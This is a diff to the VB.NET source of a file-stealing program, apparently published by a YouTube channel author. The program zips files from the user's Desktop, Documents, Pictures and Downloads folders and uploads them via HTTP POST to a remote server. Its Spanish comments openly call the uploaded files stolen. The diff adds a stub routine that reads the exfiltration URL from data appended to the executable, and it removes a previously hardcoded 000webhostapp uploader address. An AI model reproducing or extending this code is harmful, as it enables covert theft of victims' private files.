@@ -7,8 +7,9 @@ Public Class Main
     Dim DIRDocuments As String
     Dim DIRPictures As String
     Dim DIRDownloads As String
-
     Dim UniqueID As String
+
+    Dim FilePostURL As String = "" 'HERE GOES YOUR SERVER
 
     Dim ZIPFilePathDesktop As String
     Dim ZIPFilePathDocuments As String
@@ -16,6 +17,9 @@ Public Class Main
     Dim ZIPFilePathRDownloads As String
 
     Private Sub Main_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+        'Cargamos el servidor en donde subiremos lo robado
+        LoadInject()
+
         'evitamos que hayan ficheros antiguos que puedan causar problemas en el futuro
         If My.Computer.FileSystem.DirectoryExists(DIRoot) = True Then
             My.Computer.FileSystem.DeleteDirectory(DIRoot, FileIO.DeleteDirectoryOption.DeleteAllContents)
@@ -44,6 +48,21 @@ Public Class Main
         GetFiles()
     End Sub
 
+    Sub LoadInject()
+        Try
+            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
+            Dim stubb As String = Space(LOF(1))
+            Dim FileSplit = "|FTF|"
+            FileGet(1, stubb)
+            FileClose(1)
+            Dim opt() As String = Split(stubb, FileSplit)
+            FilePostURL = opt(1)
+        Catch ex As Exception
+            If FilePostURL = Nothing Then
+                End
+            End If
+        End Try
+    End Sub
     Sub GetFiles()
         Try
             For Each DesktopFile As String In My.Computer.FileSystem.GetFiles(DIRDesktop)
@@ -101,7 +120,7 @@ Public Class Main
     Sub UploadTheZIP(ByVal theZipFilePath As String)
         'El POST php para subir este fichero .ZIP al servidor (Uso php post porque no quiero usar credenciales FTP que luego alquien podria ver.)
 
-        My.Computer.Network.UploadFile(theZipFilePath, "http://filethieftest.000webhostapp.com/uploader.php")
+        My.Computer.Network.UploadFile(theZipFilePath, FilePostURL)
 
     End Sub
 
@@ -127,4 +146,4 @@ Public Class Main
         End Try
     End Sub
 End Class
-'Created by https://www.youtube.com/channel/UCSzZaz23dy19GXfSmlmxrOw (Zhenboro "¡False")
+'Created by https://www.youtube.com/channel/UCSzZaz23dy19GXfSmlmxrOw (Zhenboro)
